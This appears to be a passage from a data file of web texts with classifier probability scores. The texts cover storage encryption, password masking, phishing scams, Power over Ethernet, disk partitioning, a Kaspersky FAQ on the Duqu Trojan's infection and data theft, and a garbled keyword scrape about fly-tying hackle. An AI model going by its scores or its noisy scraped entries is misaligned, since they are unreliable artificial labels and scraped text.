array.\" But Andrew Reichman, a senior analyst at Forrester Research, believes such technology can play a role in securing data should hardware need to be returned to vendors or when it reaches end of life. Without an encryption key, third parties can't read sensitive corporate data. As a result, organisations can destroy the encryption key rather than pay for data destruction services. \"It's not an area that has been focused on much, but people are starting to see the value of addressing this issue in a more systematic way,\" Reichman said.",
        "prob": "tensor([[2.1119e-06, 1.0000e+00]])"
    },
    {
        "text": "Why do Passwords Appear as Dots in a Form? When I want to subscribe myself for a newsletter, website, online application or want to sign in, I need to put in my password. This is the easiest way to protect websites/applications and it works, but what I really don’t understand is why passwords appear as dots in the textfield. To me this is against the basics of user friendlyness because people need to see a clear result of their action, eg. a keystroke. This way you can’t know which dot represents which character (unless you start to count), so there is a possibility that you made a typo in the password. Of course this can be simply overcome with a second textfield which checks if both passwords are the same, but what happens if you copied the first password and paste it in the second textfield? Your subscription is send of for confirmation with the wrong password. It’s been encouraged to make your passwords longer (8-16 characters) and to use combinations of different characters (abc – 123 – ?!), otherwise the form will not be send away. These kind of demands make it even more difficult to avoid typos. Although I understand that you can’t put just anything in the textfield and you should think this over carefully, that doesn’t mean it can’t be done in a user friendly manner. The more I think about it, the more I wonder why and when these dots appeared for the first time… I guess it was in the ’90 when only one person had a pc and had to share it with the rest of the village. Whenever the user switched the power on, the others were watching as well, out of curiosity. Back then they had to find a way to scramble the password while typing it into the textfield to keep it a secret. All stupidity aside, this could have been a nice story, no? The obvious reason why we still set the password field as dots, is security… we didn’t want people to have a peek in the ’90 and we still don’t allow it now. The computers are getting smaller with the year and what started out as a computer for the entire village is now a small electronic device inside your pocket. The pc has never been more personal than now, making the peeking-over-your-shoulder story less likely. This solutions seems to work just fine but it has its flaws. First of all it requires an extra click from the user which can be annoying for those who go through forms with the tab key. Secondly, what if you checked your password by pushing the button and forgot to change it back to password mode? For this reason I came up with another idea, no unnecessary clicks and easier to go through the form. The status of the text field is set to ‘password’, but once you enter it with the tab key or mouse click the status is changed to ‘text’ which makes your password readable. When you leave the text field, the status is changed back to ‘password’, making your password again unreadable. Unfortunately, after two days of coding I still didn’t get the result I was hoping for. After searching on the web I’ve found an example made by viget.com. I would have liked to put the example in this post but it was conflicting with the current version of jquery. I’ve tried the code in different browsers and it works in Internet Explorer (6,7 and 8), Firefox, Safari and Google Chrome. Special thanks to the people of viget.com I’ve been looking into free online mail applications and found mailchimp as a nice solution. Apparently mailchimp is using the second solution for the password-in-dots story. Have a look at the image below. Mailchimp prompts the user to fill in their password only once. With the help of a little checkbox, you can quicly unveil the password to check it for possible typo’s. jQuery has a little plugin to unmask the password by clicking on a checkbox. Receive updates via RSS mail Get the latest articles and resources straight in your inbox, nice and easy. Have a preview of the email. You can, of course, unsubscribe at any time.",
        "prob": "tensor([[2.8446e-06, 1.0000e+00]])"
    },
    {
        "text": "Progressive Business Publication Scam Alert Identity thieves are constantly creating new ways to scam unsuspecting people. That’s why it’s essential to recognize the three most common technology-related scams known as Phishing, Vishing and SMiShing. Phishing scams use email, while Vishing attacks come over land telephones. SMiShing scams target the users of mobile devices. The common element to all three scams is to collect confidential personal and financial information. Here’s a closer look at how they work. Phising is an attempt to get your password or credit card number by sending out phony email that looks like it comes from a trustworthy entity, usually a bank but possibly also a social website, an online payment processor or even an IT company. The phony email contains a link to a site that looks and feels like a real company. If you click the link and go to the site, you’re directed to enter financial or other details, even to log in if it’s a mock up of your real bank site. But even if you do none of these, the site has probably already downloaded malware onto your computer to try to capture your private information. The term Phising is derived from fishing, and is a reference to baiting a victim into biting on a malicious link, etc. Vishing scams use Internet-based telephone systems to gain access to private and personal data. The term comes from “voice” and phishing. It goes like this: You answer the phone and an automated recording informs you your credit card, or maybe your bank account, had suspicious or fraudulent activity and you need to call a certain number right away. The recording tells you the number to call and says your account or card has been deactivated until further notice. When you call, you get another recording telling you to enter your bank or credit card number on the key pad to confirm who you are. Don’t do it. This kind of scam is also used to get a security PIN, expiration date, date of birth, etc. SMiShing is similar to the other scams, but uses cell phone text messages to deliver the bait and get someone to divulge personal information. The name is a combination of Short Message Service technology and phishing. The hook in this scam is a website or phone number the user is required to connect with. SmiShing often involves something that needs immediate attention, such as confirming you’ve signed up for a discounted subscription, and you’ll be charged $8 a day unless you cancel the order. Then it gives you a phone number to call to cancel. Of course, you can’t cancel without entering your vital personal and financial information, which is the raison d’etre behind the scam in the first place. A recent variation of this involved retail giant WalMart, which issued a fraud alert regarding a large number of SmiShing texts that offered a phony $1,000 gift card as bait. The key to handling all three of these scams requires the same reality check: If you feel a need to contact your bank or credit card company, use the number on the back of your credit card or call or visit a branch office you know for sure is real!",
        "prob": "tensor([[2.1225e-06, 1.0000e+00]])"
    },
    {
        "text": "As network technology becomes increasingly important to operate security systems, and affordably priced Internet protocol (IP) cameras and video management systems (VMS) are used more often, system designers and installers, such as electrical contractors, are realizing the need and efficiency of using power over Ethernet (PoE). First used for voice over IP (VoIP) telephones, PoE has gained popularity as a means of safely allowing power, along with data, to pass on Ethernet cabling. “PoE voltage is 48V DC and sourced from an injector, midspan or switch, which provides power. A PoE source will only provide the necessary power when it recognizes the class or signature of a compatible network device so that, in the event a non-PoE IP device is inadvertently connected, the PoE source will not provide power and damage the device,” said Ronnie Pennington, national accounts manager for Altronix Corp., Brooklyn, N.Y. From VoIP in the 1990s, PoE is now migrating to powering security system components, such as IP cameras and access control and sensor equipment. “It’s a natural choice for the security market because it enables the user to leverage a common network infrastructure,” said Patrik Pettersson, product analyst for Axis Communications Inc., Boston. It’s also more environmentally friendly because, if the device only needs 7 watts (W) to operate, the switch only allocates the required operating wattage, even though the original IEEE 802.3af 2003 PoE standard provides up to 15.2W of DC power to each device. “First and foremost, PoE standardizes the deployment of security system devices on one type of cabling infrastructure so that now only one Cat 5 or 6 data cable can be used for video transition, power to the product and control of the camera,” Pettersson said. And because the network switch now also functions as the power supply, that switch can be protected by an uninterruptible power supply (UPS) battery backup. “A power outage or other disaster is one of the most critical times for security and surveillance. With a proper disaster backup and recovery strategy, the end-user can keep the PoE-powered surveillance system running along with other critical applications,” he said. Since the PoE cable is directly tied into the intelligent network system, the power supply also is now intelligent, enabling remote control of individual circuits and devices, diagnostics and maintenance capabilities, Pettersson said. Intelligent switches that enable the user to remotely toggle the power on and off provide the choice of when to reboot a device (if necessary while troubleshooting) for minimal impact to the security and surveillance system. “It also eliminates the need for a truck and ladder to reach the camera for a physical reboot,” he said. One of the challenges, however, of using PoE for security system power is the limitation of structured cabling to transmit beyond 100 meters, according to Pennington. “IP data can be extended up to 600 meters using Ethernet repeaters, but installers and system integrators should take into consideration that there will be a voltage drop along the way,” he said. While the data range can be efficiently extended using plug-and-play repeaters, the voltage, in that case, may be insufficient to power the device, and a local power source may be needed. “Because of this, contractors need to perform proper power calculations and invest in PoE testing tools, which test both the power and data integrity of a multiple cable system,” Pettersson said. Factors to consider In choosing to use, specify or design PoE switches for a security system, it is important for contractors to select a switch that is compatible with the system’s edge devices’ power requirements and offers desired features, Pennington said. “It is ideal to use a PoE midspan or injector with an external Ethernet switch, rather than an integrated PoE switch for security. If the PoE switch is shut down for maintenance or if power is lost, the surveillance system would be inoperable, but when using a PoE midspan or injector, power is still supplied,” he said. Contractors also need to consider the power budget of the security system’s devices and perform power-draw calculations, which includes reading the PoE network switch manual and fully understanding the specifications. “For example, if a 24 port is shipped with a 150W power supply and it offers PoE on all 24 ports, it will not support 15.4W per channel, as outlined by the current standard,” Pettersson said. Moving forward, the IEEE 802.3at standard in development, also known as PoE+, will enable up to 50 or 55W sometime within the next three years. “The standard is being driven upward by the more powerful security system devices that are being developed, even as those devices are becoming more energy-efficient,” Pettersson said. BREMER, a freelance writer based in Solomons, Md., contributes frequently to ELECTRICAL CONTRACTOR. She can be reached at 410.394.6966 and firstname.lastname@example.org.",
        "prob": "tensor([[2.5292e-06, 1.0000e+00]])"
    },
    {
        "text": "Divided We Stand: A Guide to Partitioning Your Hard Drive Want to make your computer faster, easier to manage, and able to share data more securely? Dividing your hard drive into smaller sections called partitions can make your computer more manageable. Windows® 7 comes with an easy-to-use disk management tool that will help you partition your drive—and you won’t have to buy additional software. Why partition a drive? Here are a few common reasons: - More than one person uses the computer and you want to keep separate files—and access rights—for security reasons. Partitioning can be particularly helpful when you share a PC with a child. - You want to squeeze more performance out of your PC. Partitioning a large drive into smaller units improves performance by decreasing the amount of travelling the drive’s read/write head has to do when it searches for data. A partition also shrinks the size of the tables the computer uses to keep track of where data is stored, further improving performance. - You want to make your system more manageable. If you keep your operating system and applications on a partition separate from your data, the data will be easier to back up and easier to restore. What’s more, if you need to reinstall the operating system, you can do it without worrying about the data on the other partition. - You want to make your data more secure. If part of your hard drive becomes corrupted or infected with malware, the other partitions have a good chance of remaining unscathed. Step by Step Partitioning a hard drive is simplest if you haven’t already loaded applications and data, so if you’ve just purchased your PC, now is the time to do it. However, you can do it at any time. Just be sure you do a complete backup before you start. To turn one partition into two partitions: 1. Open the Control Panel, Administrative Tools and click Computer Management. 2. Double-click Storage in the middle pane, and then double-click Disk Management 3. \"Disk 0\" represents your primary hard drive. If your drive has not been partitioned, the C: drive will fill most or all of the space 4. Right-click on the C: drive or on unpartitioned space and click \"Shrink Volume.\" (Windows refers to partitions as volumes.) Windows will you for the amount of space you wish to shrink; this will become the amount of space available for the new partition. Choose an amount that matches the amount of data you expect to store there: Less for 5. Follow the s to complete the shrink function. 6. You will now have unpartitioned space in which you can create a second partition. Right-click in this unallocated space and click \"New Simple Volume.\" Follow the s to set the size of the partition and assign a drive letter to this space. 7. Finally, you will be ed to format the new partition you’ve made. Select OK at the s to complete the format operation. Your new partition is ready to use. For more help on disk partitioning, consult this guide The above content is provided for information purposes only. All information included herein is subject to change without notice. Samsung Electronics is not responsible for any direct or indirect damages, arising from or related to use or reliance of the above content. - Why LED Monitors Are Best for You - Which is Right for You: Netbook or Notebook? - 4 Ways to Back Up Your Laptop - Mobile CPU Roadmap: Picking the Right Intel Chip - Samsung Laptops: Something for Everyone - Laptop Memory Basics – What's Best: DDR2 or DDR3? - HDTV Monitor 101 - Top Ten Benefits of SSD - Green Report Card - Finding the Killer Computer",
        "prob": "tensor([[0.2454, 0.7546]])"
    },
    {
        "text": "This is an active investigation by Kaspersky Lab's Global Research & Analysis Team. We will be updating this FAQ document as necessary. Duqu is a sophisticated Trojan which seems to have been written by the same people who created the infamous Stuxnet worm. Its main purpose is to act as a backdoor into the system and facilitate the theft of private information. This is the main difference when compared to Stuxnet, which was created to conduct industrial sabotage. It's also important to point out that while Stuxnet is able to replicate from one computer to another using various mechanisms, Duqu is a Trojan that doesn't seem to replicate on its own. Unlike Stuxnet, Duqu doesn't target PLC/SCADA equipment directly, although some of its subroutines could be used to steal information related to industrial installations. It appears that Duqu was created in order to collect intelligence about its targets, which can include pretty much anything that is available in digital format on the victim’s PC. In the cases we have analysed, Duqu infects a computer through a targeted attack involving a Word document which exploits the CVE-2011-3402 vulnerability. This is a 0-day vulnerability in the Windows kernel component Win32k.sys which allows the attackers to run code with the highest privilege level, bypassing pretty much most of the protection mechanisms from Windows or security software. According to our knowledge, Duqu is the only malware using this vulnerability to infect computers. All Kaspersky Lab security solutions detect this vulnerability under the name Exploit.Win32.CVE-2011-3402.a as of November 6, 2011. There is indeed a 0-day vulnerability being used to infect computers in the initial phase. Microsoft released an advisory (2639658) with basic information and mitigation steps. Duqu was brought to the attention of the security community by the Hungarian Research Lab CrySyS. They were the first to point out the resemblance to Stuxnet and perform what remains the most thorough analysis of the malware yet. The first Duqu attacks were spotted as early as mid-April 2011. The attacks continued in the following months, until October 18, when news about Duqu was made public. It appears that there are at least seven variants of the Duqu drivers, together with a few other components. These are all detected with different names by various anti-virus companies, creating the impression that there are multiple different variants. At the time of writing, we are aware of two Infostealer components and seven different drivers. Additionally, we suspect the existence of at least another Infostealer component which had the capability to directly search and steal documents from the victim's machine. While there are indeed reports indicating that the main goal of Duqu is to steal information from CAs, there is no clear evidence at this time to support this claim. On the contrary, we believe the main purpose of Duqu was different and CAs were just collateral victims. One suspicion is that Duqu was used to steal certificates from CAs that can be used to sign malicious code in order to make it harder to catch. The functionality of the backdoor in Duqu is actually rather complex and it can be used for a lot more. Basically, it can steal everything, however, it looks like attackers were particularly interested in collecting passwords, making desktop screenshots (to spy on the user) and stealing various kinds of documents. The initial Duqu C&C server, which was hosted in India is no longer active. Just like in the case of Stuxnet, it was pulled offline pretty quickly once the news broke. In addition to this, we are aware of another C&C server in Belgium, which was also quickly taken offline. Actually, it appears that every single Duqu targeted attack used a separate C&C server. Maybe the author was a fan of round numbers, such as 6x6? :) Actually, the time for which Duqu is running in the system is defined by the configuration file and varies between the attacks. We have also seen instances where the duration was set to 30 days. The same gang who was behind Stuxnet. Curiously, they seem to have picked up an interest in astronomy; the infostealer executable has a portion of a JPEG file picked up by the Hubble telescope (“Interacting Galaxy System NGC 6745”): The picture portrays the aftermath of direct collision of two galaxies(!), several million of years ago. You can read the story here. UPDATE (November 15, 2011): When activated, the main Duqu program body connects to its C&C server and downloads updates and supplemental modules. One such module is the Duqu \"infostealer,\" for which two versions are known and others are believed to have existed at various points in the time. The \"infostealer\" module is downloaded in memory and executed through the process injection technique used by Stuxnet and Duqu to avoid temporary files. This is done in order to make sure that the \"infostealer\" component (and other Duqu updates) will not be intercepted or left behind on an infected machine. It also means that they have a limited lifetime, basically until the next system reboot. The most powerful version of the \"infostealer\" has the ability to intercept keystrokes, it makes screenshots of the whole screen (first time) and of the active window, collects the IE browsing history and various data related to the system network configuration. There is also code which can do browsing of network shares. All this information is nicely packaged into a file that is written into the %TEMP% folder by default. It is a compressed BZIP2 format with modified headers. Thanks to the BZIP2 compression, the files are smaller than you'd think. The \"infostealer\" components we have seen create files with the name \"~DQx.tmp\". In addition to this, we are aware of other files with the name \"~DFxxxxx.tmp\" and \"~DOxxxxx.tmp\". The \"DF\" and \"DO\" have a similar format and appear to have been generated by an earlier version of the \"infostealer\". They also contain more information, including various files the victim PC such as Word or Excel documents. The \"~DF\" files are generally much bigger, due to their additional file content. In all cases, they are easy to recognize by the header \"ABh91AY&SY\". If you find such files in your PC then most likely you've been a victim of Duqu. If you'd like to scan your system for such files, the nice people at CrySyS have a set of tools that can help. Duqu and Stuxnet have a lot of things in common. Usage of various encryption keys, including ones that haven't been made public prior to Duqu, injection techniques, the usage of zero-day exploits, usage of stolen certificates to sign the drivers, all of these make us believe both have been written by the same team. So, what does that mean exactly? Simply put, different people might have worked on Duqu and Stuxnet, but most likely they worked for the same \"publishing house.\" If you want an analogy, Duqu and Stuxnet are like Windows and Office. Both are from Microsoft, although different people might have worked on them. In the incidents we have analyzed, Duqu arrives in the system in the form of a Microsoft Word Document. The document contains an exploit for the vulnerability known as CVE-2011-3402. This is a buffer overflow in a function of Win32k.sys which deals with True Type fonts. To exploit this specific vulnerability, an attacker needs to craft a special True Type Font and embed it into a document, for instance, a Word Document. Now, for the connection part - in the incident we've analyzed (and this is also true for the other known incident), the attackers used a font presumably called \"Dexter Regular\", by \"Showtime Inc.,\" (c) 2003. This is another prank pulled by the Duqu authors, since Showtime Inc. is the cable broadcasting company behind the TV series Dexter, about a CSI doctor who also happens to be a serial killer who avenges criminals in some post-modern perversion of Charles Bronson's character in Death Wish. We hope they are just fans of Dexter. Interestingly, the same constant can be found in Duqu as well. The Hungarian CrySyS lab was the first to point out the usage of 0xAE790509 in Duqu. In the case of Stuxnet, the integer 0x19790509 is used as an infection check; in the case of Duqu, the constant is 0xAE790509. What is less known is that 0xAE790509 was also used in Stuxnet, however, prior to Duqu this was not included in any of the public analyses we are familiar with. There are also many other places where the constant 0xAE is used, both in Duqu and Stuxnet. Finally, the constant 0xAE240682 is used by Duqu as part of the decryption routine for one of the known PNF files. In case you are wondering, 24 June 1982 is indeed an interesting date - check out the case of BA flight 9. * Research by Kaspersky Lab Global Research & Analysis Team. Costin Raiu of Kaspersky Lab's Global Research and Analysis Team talks about the investigation into Duqu, the likelihood that it was written by the same team as Stuxnet, whether a government is behind its development and what mistakes the authors made. Download the podcast from the Threatpost site. 2011 Oct 22, 20:01 Duqu can steal everything? @Symantec says this is targeted to specific organizations, possibly with a view to collecting specific information that could be used for future attacks. What kinds of data are they looking for and what kinds of future attacks are possible?",
        "prob": "tensor([[2.0923e-06, 1.0000e+00]])"
    },
    {
        "text": "- Definition of hackle in the Online Dictionary. Meaning of hackle. Pronunciation of hackle. Translations of hackle. hackle synonyms, hackle antonyms. Information about hackle in the free online English dictionary and encyclopedia. saddle hackle. — “hackle - definition of hackle by the Free Online Dictionary”, - Far West Fly Shop offers the best selection of fly tying hackle, including Whiting hackle fly and a variety of tying capes. Find the best quality here. — “Fly Tying Hackle - Whiting Hackle | Fly Tying Capes”, - The Hook & Hackle Company encourages support of those \"Wounded Warriors\" who have The Hook & Hackle Company Guarantee. If for any reason you're unhappy with any Hook & Hackle brand product, for whatever reason,. — “Hook & Hackle Company”, - Definition of hackle from Webster's New World College Dictionary. Meaning of hackle. Pronunciation of hackle. Definition of the word hackle. Origin of the word hackle. — “hackle - Definition of hackle at ”, - Guide and fly shop serving Rock Creek and the Bitterroot, Blackfoot, and Clark Fork Rivers of Western Montana. The Grizzly Hackle has the area's finest guiding staff, a dedicated crew that has introduced thousands of anglers - beginners and experts alike - to the trout of western Montana. — “Grizzly Hackle The Premier Fly Shop and Outfitter in the”, - The hackle is a feather plume that is attached to the headdress. In the British Army and the armies of some Commonwealth countries the hackle is worn by some infantry regiments, especially those designated fusilier regiments and those with Scottish and Northern Irish origins. — “Hackle”, - Conranch Hackle produces a Premium dry fly hackle that is second to none. This is an old flock that has consistently produced top quality hackle and saddles. — “Conranch Fly Tying Hackle”, - Definition of word from the Merriam-Webster Online Dictionary with audio pronunciations, thesaurus, Word of the Day, and word games. plural a : erectile hairs along the neck and back especially of a dog b : temper, dander. — “Hackle - Definition and More from the Free Merriam-Webster”, merriam- - Quality custom tied flyfishing flies for the discriminating flyfisherman. Welcome to ! Welcome to ! We offer hand-tied flies tied by expert fly tier David Tomé. A variety of field tested fly patterns are available as well as custom tied flies. — “Welcome to !”, - Learn about Hackle on . Find info and videos including: How to Tie a Wet Hackle, Types of Soft Hackles, How to Use Hackle Pliers for Fly Fishing and much more. — “Hackle - ”, - The terms \"hackling a fly\" or \"wrap the flies hackle\" refers to tying a feather and wrapping it around the hook shank of the fly. Hackle from a rooster are usually used for dry flies because they are hard and stiff, do not soak up water and support the fly on the water. — “Fly Tying Hackle Selection, Fly Tying Workshop and”, - West Yellowstone fly shop with a huge selection of Whiting hackle, saddle hackle and fly tying materials from JimsFlyco at great prices. — “Whiting Hackle | West Yellowstone fly shop | JimsFlyco”, - (usually now, in plural) By extension (because the hackles of a *** are lifted when it's angry), the hair on to hackle (third-person singular simple present hackles, present. — “hackle - Wiktionary”, - hackle n. Any of the long, slender, often glossy feathers on the neck of a bird, especially a male domestic fowl. — “hackle: Definition from ”, - Shop for Hackle. Price comparison, consumer reviews, and store ratings on . — “Hackle - - Product Reviews, Compare Prices, and Shop at”, - W. W. Doak Miramichi Atlantic Salmon Fly Fishing Tackle Shop - Sage, St.Croix, Islander, Lamson, Ross, Teton, Abel, S. A. Mastery, Simms, Atlantic Salmon Flies & Leaders Althought it is not as long as the hackle found on most saddle patches, it is a little wider, making it better for larger flies. — “Hackle - W. W. Doak and Sons Ltd. Fly Fishing Tackle”, - hackle lodge luxury hotel accommodation Mpumalanga,dullstroom,fly fishing leisure cottagesSouth Africa.Hackle Lodge,Machadodorp,beautiful countryside 2 hours drive from Johannesburg,Gauteng. — “Hackle Lodge Country Estate,South Africa-Luxury lodge”, - Hackle definition, one of the long, slender feathers on the neck or saddle of certain birds, as the domestic rooster, much used in making artificial flies for See more. — “Hackle | Define Hackle at ”, - The hackle is a feather plume that is attached to the headdress. In the British Army and the armies of some Commonwealth countries the hackle is worn by some infantry regiments, especially those designated fusilier regiments and those with Scottish and Northern Irish origins. — “Hackle - Wikipedia, the free encyclopedia”, - howard hackle is a family operated hackle farm located in didsbury, alberta, canada. our northern location leads to enhanced hackle quality as the birds adapt with increased feather population and barb count. this produces the highest quality. — “Welcome to Howard Hackle: About Us”, - Hackle Pliers Manufacturers & Hackle Pliers Suppliers Directory - Find a Hackle Pliers Manufacturer and Supplier. Choose quality Hackle Pliers Manufacturers, Suppliers, Exporters at . — “Hackle Pliers-Hackle Pliers Manufacturers, Suppliers and”, - Fly Tying Materials, Rare Fly Tying Materials, Fly Tying Vises, Tube Fly Materials, Tube Flies, Fly Tying - Hackle, Medium Dyed Blue Eared Pheasant, Barred Variant Schlappen, Spey Plumes, Blue Eared Pheasant, Dryfly Hackle, Ostrich, Schlappen,. — “Fly Tying Materials, Rare Fly Tying Materials, Fly Tying”, related images for hackle - Quotes for custom colors and quantities available by request Email the office Colors Available Blue Green Teal Black Purple Black Blue Black Red Black Orange Black Green Black Lt Blue Black - I think the flames would be a progression of the red to orange to gold to chartruse I m worried that the pink feathers would not carry to the bottom but I don t want a fire colored bust - hackle2 jpg - もありけっこう病みつきになっていきます 評判の良かったものを巻こうとすると マテリアルが足りなくなり最近は買い足しています 写真のハックルはホワイティングのシルバーグレードですが さすがホワイティング博士 その進化たるや信じられないほどです - hackle1 JPG - ＣＯＱ ＤＥ ＬＥＯＮ Ｓｏｌｉｄ 蛍光オレンジ ¥１５００ ＵＰ画像 通常 Ｃｏｑ Ｄｅ Ｌｅｏｎ はドライフライのテールやマドラーミノーのハックル等にお使いいただけますが 今回 - The price will be determined by current market prices for steel and the US dollar vs the Canadian dollar Please send your specificaitons and I will get a current price for you And here is the man that makes all these combs possible - hackle1 jpg - 21mm x 56mm 7 8 x 2 1 4 Jaw length 8mm 5 16 Price is $3 95 each - 1 per color in stock for special price $35 00 ea Quotes for custom colors and quantities available by request Email the office - Homer s Newest Fly Shop and KGB headquarters the Hackle Shack offers hand tied flies premium gear and guided trips to world class places Knowing Where to Go The Hackle Shack offers a large menu of guided trips and here are just a few 7 Days on the Alagnak The Alagnak offers one - Wind the hackle from the front through 3 turns making sure the fibres do not trap each other back towards the thread Tie off the hackle with 2 3 turns and snip off waste as close to the hook as possible - インド Ｃｏｃｋ サドル ダイド 全３種 ¥５８０ Ｆｌｙ Ｓａｍｐｌｅ こちらから ＵＰ画像 ◇蛍光オレンジ ◇蛍光イエロー ◇蛍光グリーン スペイ コック ハックル ナチュラル 全３種 ¥５５０ - =DOWNLOAD= 3d example files - Here s one with saddle and pea*** in the loop Finished body - Finished body Sorry bout the poor pics I kinda rushed this post but you get the idea Wasatch made a very comprehensive DVD with Mitch demonstrating all the techniques of the tool It takes some - hackle jpg - live in a human world Kind of a reverse Dr Doolittle gadget Very cool photo reads I really love you 90 wpm Alright 80 wpm Walkies 55 wpm I d Like My Dinner 40 wpm Update 3 7 08 I received a lovely note from James Auger one of the LED Dog Tail Communicator designers He shared one of his other ingenious dog devices The Augmented Dog Hackle - click for larger pics Then I got the hackle out and processed the grapejuice dyed fiber shetland + silk and the red cabbage dyed fiber shetland + silk + mohair - eq2 hackle jpg - Metz hackle1 JPG - ＣＯＱ ＤＥ ＬＥＯＮ Ｍｅｄｉｕｍ Ｐａｒｄ 蛍光オレンジ ¥１５００ ＵＰ画像 通常 Ｃｏｑ Ｄｅ Ｌｅｏｎ はドライフライのテールやマドラーミノーのハックル等にお使いいただけますが 今回の - Round Rubber Hackle jpg - 羽毛 人造材料 - hackle stac jpg - <ハーフ カット> 全６色 ¥２７００ ¥３２００ ◆ナチュラル ◆ブラウン ◆オリーブ ◆ダークブラウン ◆イエロー ◆オレンジ 左から ◆ナチュラル ◆ダークブラウン ◆オリーブ ◆ブラウン ◆イエロー ◆オレンジ - Now tie in a Blue Hackle and a Black Hackle wind the hackles together down the body and secure with the rib - <ハーフ カット> 全６色 ¥２７００ ¥３２００ ◆ナチュラル ◆ブラウン ◆オリーブ ◆ダークブラウン ◆イエロー ◆オレンジ 左から ◆ナチュラル ◆ダークブラウン ◆オリーブ ◆ブラウン ◆イエロー ◆オレンジ - Wired Bead Head Prince Nymph http www riverbum com images produ dHead side jpg Soft Hackle CDC Nymph http planettrout files wordpress c oft hackle jpg Brown Mini Mirage Stone http www littledeschutesflyco com minimirage JPG - thackles jpg - rozwiązania Jednak wiązanie spadochroniarki nie wymaga aż takich zachodów Jak pokazuje to wideo spadochroniarkę można ukręcić w dwie minuty przy użyciu zwykłego imadła i rotacyjnych szczypców do jeżynek ten przyrząd przyda się do wiązania także innych much Kilka uwag proszę zauważyć że krętacz nawija jeżynkę od góry do dołu i mocuje ją - フライ用 ＳＡＤＤＬＥ ＣＡＰＥ ＣＵＴ ¥１０５０ ２２５０ ドライフライ用 ＣＯＣＫ ＮＥＣＫ １ ２ ¥２０００ ３８００ ＵＰ画像 - 左から ◆ブラウン ◆オリーブ ◆ナチュラル - ＨＥＢＥＲＴ ＭＩＮＥＲ ＲＯＯＳＴＥＲ ＣＡＰＥＳ ¥７０００ 左から ＳＯＬＤ ＯＵＴ ＳＯＬＤ ＯＵＴ ◆Ｄｕｎ Ｂａｄｇｅｒ ◆Ｍｅｄｉｕｍ Ｇｒｅｙ Ｄｕｎ ◆Ｄａｒｋ - COLORS Chinese View Colors - hackle storm jpg - it has a strong grip and can be used as a short temporary bobbin The smaller ones can be hard to use if one suffers from arthritis or lack strength in fingers All items made in India 8mm x 48mm 5 8 x 1 7 8 Jaw length 6mm 1 4 Price is $3 00 each - ＨＥＢＥＲＴ ＭＩＮＥＲ ＲＯＯＳＴＥＲ ＣＡＰＥＳ ¥７０００ 左から ＳＯＬＤ ＯＵＴ ＳＯＬＤ ＯＵＴ ◆Ｌｉｇｈｔ Ｇｏｌｄｅｎ Ｏｌｉｖｅ ◆Ｙｅｌｌｏｗ related videos for hackle - Blending Hackle #1 How To Make Smooth Roving & Diz It Off how to make and diz smooth roving using mill prepped fiber - The Partridge and Yellow Soft Hackle Tying and fishing the classic Partridge and Yellow soft hackle fly. - Palmering Hackle Demo with Jay Nicholas In this new fly tying video, Jay Nicholas demonstrates the right way to palmer hackle on flies like wooly buggers, stimulators -- basically any fly that uses a hackle down the hook. For more fly tying tips, check out . - Holy Molar - Hackle The Hackle section from the Holy Molar - Dentist The Menace DVD. Sorry it's in black and white. But it does add raw emotion to it. - The Red Hackle Pipe Band - Marching Training #1 The Red Hackle Pipe Band gets taught how to march decently. The special guest and teacher for today is none other than [name to be posted later... maybe...], an ex-member of the Black Watch! - Parks' Fly Shop: Tying the White Miller Soft Hackle This is a fuzzy-bodied soft hackle caddis emerger pattern that's deadly on the Firehole River in June and September, where it imitates the Nectopsyche caddis. Hook: short shank dry #14. Thread: 8/0 light cahill Uni. Abdomen: pearl Ice Dub dubbed rough. Thorax: light shade Arizona Synthetic Pea*** dubbed rough. Hackle: cream hen. - Fly Tying: How to Tie the Woolly Bugger : Tying the Hackle & Rib: Woolly Bugger Fly Learn how to tie the hackle and rib of a Woolly Bugger fly in this free video on fly fishing. Expert: Jeff Wilkins Bio: Jeff Wilkins is that rare fly fisherman who is equally skilled at the tying bench and on the stream. A certified casting instructor, Wilkins began tying and guiding professionally in college. Filmmaker: Tom Jackson - Tying the Hackle Stacker Tying the Hackle Stacker BWO. Materials: #14 Emerger Hook, 8/0 Olive-Brown Thread, Gray Antron, Olive Turkey Biot, Olive CDC, Grizzly- Dyed Olive Hackle, Dark Green Spectrablend Dry Dubbing. - Tying the Partridge and Orange Soft Hackle Jeff Hines deomonstrates tying the Partridge and Orange soft hackle fly. Filmed at the 2003 FFF Southern Council Conclave in Mountain Home, Arkansas. - Spey Fly Hackles Atlantic Salmon Steelhead Fly Fishing Here is a simple way to make Spey hackles for fishing flies. The cost factor for using Blue Eared Pheasant and the like is just too high. Here is a way to make a great hackle at a fraction of the cost. Make sure you brush the wet feathers into shape and lay flat on paper to dry. - Gartside Soft Hackle - Bead Head Pheasant Tail Soft Hackle Fly tying demonstration of the bead head pheasant tail soft hackle. A fly tied with pheasant tail body, a pea*** herl thorax, and partridge soft hackle. - DIY Hackle loading This video shows how to load fiber onto a DIY Hackle made from hair picks and a board. For how to make this hackle.... - Fiber Hackle, Wool Roving, Diz Removing blended wool from a hackle with an improvised diz; creating blended wool roving. The thin plastic diz was made from a coffee lid at Starbucks. The handmade hackle came from *fiberwish*/punkiedoodledo on Etsy and eBay. - Hackle Selection: Picking a feather for steelhead fly collars How do you pick a feather for hackling a steelhead fly? What kind of hackle do you use for a nice collar? Barrett Christiansen from The Caddis Fly Shop lays out the various hackles available, and weighs the pros and cons of each option. For more fly tying videos, check out . - How to palmer schlappen and hackle steelhead jigs. This is a brief tutorial on how to palmer schlappen and hackle steelhead jigs using solid brass beads instead of lead for the jig head. - Fiberwish Wool and Fiber Hackle How to use the Fiberwish Wool and Fiber Hackle. - Fly Tying - Part 8 - Hackle Nor-Vise Fly Tying System. Created by Norm Norlander, this is a great tool for any fly fisherman who wants to learn how to tie their own flies. Website: www.nor- - Tying the Hackle Stacker How to tie Quigley's Hackle Stacker with Missouri River guide Mike Kuhnert. - Tying the Holographic Soft Hackle Robert Prytula demonstrates tying his Holographic Soft Hackle fly, an effective fly for trout in East Tennessee. I've fished this fly in cloudy water conditions and it was very effective. Tie some up just for these conditions. Filmed at the 2007 FFF Southern Council Conclave in Mountain Home, AR. - Fly Fishing with a Woolly Bugger : How to Palmer Woolly Bugger Hackle Palmering the woolly bugger's hackle forward. Learn how to go fly fishing with awoolly bugger fly in this free video on fly tying. Expert: Alvin Dedeaux Contact: Bio: Alvin has been a fly fishing guide and casting instructor for 12 years, and has been fly fishing for 32 years. He is a graduate of the Joan Wulff fly casting instructor's school. Filmmaker: MAKE | MEDIA - Tying standard hackle tip wings Using hackle tips to create standard Adams style dry fly wings - Wool Combing, Fiber Combs, Hackle and Tools #2 